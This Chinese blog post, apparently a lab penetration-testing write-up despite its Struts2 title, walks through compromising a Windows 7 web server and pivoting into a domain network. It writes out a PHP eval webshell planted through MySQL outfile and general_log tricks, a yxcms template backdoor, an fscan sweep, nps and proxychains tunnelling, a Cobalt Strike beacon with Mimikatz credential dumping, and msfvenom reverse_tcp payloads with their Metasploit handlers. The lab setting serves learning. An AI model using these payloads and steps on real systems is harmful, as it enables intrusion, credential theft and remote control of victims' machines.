---
layout: post
title: Structs2漏洞复现
categories: [blog ]
tags: [内网渗透,]
description: ""
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: shzqiip
---





## <1>靶机环境搭建

ip设置如下：

```java
kali(攻击机):192.168.236.130 
Windows 7 (web服务器)：192.168.236.132（外网和kali连通）、192.168.52.143（内网ip）
Windows 2008(域控): 192.168.52.138
Win2k3(域管): 192.168.52.141
```

可以看到Windows7是双网卡的（`既通外网又通内网` ),Windows7、Windows2008、Win2k3是在52段的局域网内的。

这里肯定是从 Windows7(web服务器)入手， 看有什么漏洞

## <2>外网边界突破

#### （1）、信息收集

直接扫描 Windows 7 (web服务器)：192.168.236.132 看有什么发现

![image-20240103123642941](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103123642941.png)

#### （2）PhpMyAdmin后台Getshell

phpmyadmin有两种getshell方式：

- into outfile导出木马
- 利用Mysql日志文件getshell

发现有一个数据库的服务，弱口令root/root，可以看到有执行sql命令的地方，尝试写马试试

查看网站的路径

![image-20240103130452105](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103130452105.png)

`select '<?php @eval($\_POST\["c"\]);?>' into outfile "C:/phpStudy/MySQL/www/cxk.php"`

发现不能执行这个语句。。。

![image-20240103125553705](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103125553705.png)

这是因为 Mysql新特性secure_file_priv会对读写文件产生影响，该参数用来限制导入导出。我们可以借助`show global variables like '%secure%';`命令来查看该参数

[![img](https://img2023.cnblogs.com/blog/3074366/202303/3074366-20230315183007445-2103222599.png)](https://img2023.cnblogs.com/blog/3074366/202303/3074366-20230315183007445-2103222599.png)

当secure_file_priv为NULL时，表示限制Mysql不允许导入导出，这里为NULL。所以into outfile写入木马出错。要想使得该语句导出成功，则需要在Mysql文件夹下修改my.ini 文件，在[mysqld]内加入secure_file_priv =""。

本来想着直接修改值不就可以了？（`发现是只读属性，那没事了`）

![image-20240103130915175](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103130915175.png)



##### 直接写入木马不行，那我们就换另一种方法---Mysql日志文件写入shel

先执行命令：`show variables like '%general%';`查看日志状态

![image-20240103131108801](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103131108801.png)

 当开启general_log时，所执行的SQL语句都会出现在stu1.log中，发现日志的存储位置，尝试能不能修改为php后缀

`set GLOVAL general_log='on'`

这里写成www根目录，用过phpstudy的应该清楚那个目录结构

```
SET GLOBAL general_log_file='C:/phpStudy/www/cxk.php'
```

![image-20240103131839306](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103131839306.png)

传上去了，直接蚁建

![image-20240103132044867](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103132044867.png)

![image-20240103132103696](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103132103696.png)

### （3）yxcms后台上传getshell

这里字典没有扫到， 但是数据库中有这个名字的数据库，可以尝试访问/yxcms路由

可以看到公告栏中泄露了（账号/密码）直接登录后台

![image-20240103133639084](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103133639084.png)

我们可以修改php文件的内容，但是我们不知道php文件 所在的位置，抓包看一下

![image-20240103133714766](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103133714766.png)

![image-20240103133811886](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103133811886.png)

burp也没找到php文件的存放位置 ，发现还有一个文件是`beifen.rar`，呃呃扫不到直接拿来用的

我们把备份文件解压，在里面寻找模板的这么多php 都存放在了:`/yxcms/protected/apps/default/view/default/`

直接新建一个模板写入马即可

![image-20240103134908312](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103134908312.png)

## <3>内网信息探测

连接上蚁剑后，使用虚拟终端：

发现是双网卡的一个连接外网一个连接内网，首先上传fscan扫描一下（看内网有没有东西）

![image-20240103135645323](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103135645323.png)

上传一个fscan（注意：这里是windows的环境）

直接上传fscan需要因为是windows需要上传后缀是.exe的 `K:\冀信杯渗透测试\fscan.exe`

`fscan -h 192.168.52.0/24 -np -nobr -nopoc > cxk.txt`

```java
C:\phpStudy\WWW> more cxk.txt
start infoscan
192.168.52.141:21 open
192.168.52.143:80 open
192.168.52.138:80 open
192.168.52.138:135 open
192.168.52.143:135 open
192.168.52.141:135 open
192.168.52.143:139 open
192.168.52.141:139 open
192.168.52.138:139 open
192.168.52.143:445 open
192.168.52.141:445 open
192.168.52.138:445 open
192.168.52.143:3306 open
192.168.52.141:7001 open
192.168.52.138:88 open
192.168.52.141:7002 open
```

如果直接访问192.168.52.这个域是访问不到的，所以这时候就需要我们挂代理（只会nps。。）

#### 因为刚接触不久nps这里会详细讲解（可直接省略）

首先启动我们的nps server，默认账号密码  admin/123  K:\冀信杯渗透测试\nps\windows_amd64_server\nps.exe

##### 1、创建一个客户端，可以看到ID：为6（`这里后面要用所以记住`)

![image-20240103141343845](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103141343845.png)

#####  2、创建一个SOCKS代理，这里的端口就是一个映射那种（这是我目前的理解，不一定对）

就相当于所有的流量，都会从这个代理端口中流出,右边的方格就是内网内的机器

![image-20240103141836559](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103141836559.png)

![image-20240103141949718](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103141949718.png)

##### 3、把nps客户端上传到windows靶机上

但是执行确连接不上

```java
**C:\phpStudy\WWW>** npc.exe -server=127.0.0.1:8024 -vkey=rzxdd22ayokt1rnt -type=tcp

**C:\phpStudy\WWW>** npc.exe -server=192.168.100.14:8024 -vkey=rzxdd22ayokt1rnt -type=tcp
```

```java
kali(攻击机):192.168.236.130 
Windows 7 (web服务器)：192.168.236.132（外网和kali连通）、192.168.52.143（内网ip）
Windows 2008(域控): 192.168.52.138
Win2k3(域管): 192.168.52.141
本机：127.0.0.1 / 192.168.236.1 / 192.168.100.14
```

本来一开始用的是 127 和 192.168.100.14这两个没通，后来想明白了（用那俩地址靶机能访问到？？？) 改了之后直接就通了

![image-20240103193327879](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103193327879.png)

![image-20240103193431062](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103193431062.png)

可以发现我们访问 127.0.0.1:8089 ---->192.168.52.143:80映射了过来

![image-20240103193548753](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103193548753.png)

那么用socks代理搭配Proxifier软件做一个全局代理

![image-20240103194554290](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103194554290.png)

![image-20240103194605150](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103194605150.png)

![image-20240103194620726](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103194620726.png)

地址也可以改成局域网的地址，这样都能访问到，就不用挂多个代理了

![image-20240103194726750](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103194726750.png)

成功

![image-20240103194820787](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103194820787.png)

查看之前fscan的结果发现扫描出了二台主机（138和141 windows版本都扫描出来了）

![image-20240103195130351](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103195130351.png)

### windows挂代理就是上面，但是我的工具基本都在kali里面（所以能不能直接让kali挂上代理）

```java
#如需修改默认占用端口： 修改 /etc/nps/conf 下的 nps.conf 文件
nps 
nps start
nps stop
//查询端口杀死进程
netstat -ntlp
ps -ef|grep nps
kill -9 进程id
```

客户端上传解压 `tar xzvf linux_amd64_client.tar.gz`

```java
./npc -server=192.168.236.130:8024 -vkey=rxvep66lpwxpomss -type=tcp  >/nps.txt  //存储后台启动日志
```

到这里张记性了直接用192.168.236那个ip的地址

（搞笑的是windows系统，不带tar xzvf 所以需要手动一个个文件上传然后进行拼接）

`这里又犯傻了，想在windows靶机上面传一个linux的nps，（😟😟😟）`

![image-20240103205123157](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103205123157.png)

准备搞全局代理，kali我记得是自带proxi这个东西的

```java
proxychains -h //这里就可以看到conf配置文件的位置
```

![image-20240103210644290](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103210644290.png)

`vim /etc/proxychains4.conf`  (端口就是我们设置的在nps中)

![image-20240103210715752](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103210715752.png)

然后使用的话在命令前面加上`proxychains即可`

本来我是用ping来测试通不通内网的一直没字节返回，以为是我自己的错误，但是尝试了一下curl发现通了！

![image-20240103210855741](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103210855741.png)

用dirsearch也是可以扫描的，以此类推fscan这些都是可以的

![image-20240103211019420](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103211019420.png)

因为kali挂的是proxychains 不能在浏览器直接访问对应的页面，这时候可以用windwos本机的Proxifier连接kali里配置的

`需要用的是kali局域网的网段，不能是127.0.0.1`，在这里就是`192.168.236.130`

![image-20240103212842842](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103212842842.png)

![image-20240103212850844](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103212850844.png)

配置完就可以了

```java
这里实现了kali和windows，即linux和windows挂nps代理，以及局域网的共享代理😼😼😼蛮有趣的，大概花费了：6个小时
```

### (2)靶机上线cs

 在kali里 `./teamserver 192.168.136.130 cs123456` 运行cs服务(运行服务端)

![image-20240104124839162](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104124839162.png)

（运行客户端）

`java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar`

首先配置listener监听器

![image-20240104125110603](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104125110603.png)

可以发现有很多种（现在还不太懂各自的用法）

![image-20240104125314882](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104125314882.png)



主机运行CS 客户端并连接 CS 服务端，配置好listener监听器之后，生成 exe后门程序

![image-20240104125413145](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104125413145.png)

然后用蚁剑把生成的artifact.exe上传到靶机上：（成功上线）

![image-20240104125453543](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104125453543.png)

点击这个类似瞄准的按钮，会显示域内的机器

![image-20240104125608889](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104125608889.png)

执行猕猴桃，抓取靶机密码

![image-20240104125735689](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104125735689.png)

![image-20240104125802775](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104125802775.png)

到这里需要登录就不太懂了（润去看看文章）

![image-20240104125831119](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104125831119.png)

`在cs中执行命令需要加上 shell，比如 shell whoami`



## 把cs中的回话派生到msf中

前提是 cs已经获得了靶机的会话

kali中msf需要进行的操作

```java
msfconsole
set payload windows/meterpreter/reverse_http
set lhost 192.168.236.130
set lport 7777
exploit 
```

这里都是msf的ip和监听的端口

![image-20240104212055352](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104212055352.png)

直接派生回话即可，然后看msf即可

![image-20240104212120119](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104212120119.png)

##### msf的简单利用

判断靶机 是否属于虚拟机（检查是否进入了蜜罐）

```java
run post/windows/gather/checkvm
```

![image-20240104212412273](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104212412273.png)

在如调用`post/windows/gather/enum_applications`模块枚举出安装在靶机上的应用程序：

![image-20240104212635472](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240104212635472.png)





## msf生成控制服务器的方式

前提环境：被远控的机器(受害者)，msf所在域(攻击者)必须是相通 ping可以通

```java
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.236.130  LPORT=4444 -f exe > shell.exe
//这里的ip和端口是（攻击者的ip和监听的端口）
windows/meterpreter/reverse
windows/meterpreter/reverse_http, windows/meterpreter/reverse_https  
linux/x86/meterpreter/reverse_tcp  //32位
linux/x86/shell_reverse_tcp      //64位
```

```java
 kali 命令窗口通过：msfconsole
    
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.236.130 //这些和上面是对应的
set lport 4444
exploit  //这里其实就是监听端口
```

然后把生成的exe上传到靶机，直接运行

![image-20240103192146938](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240103192146938.png)



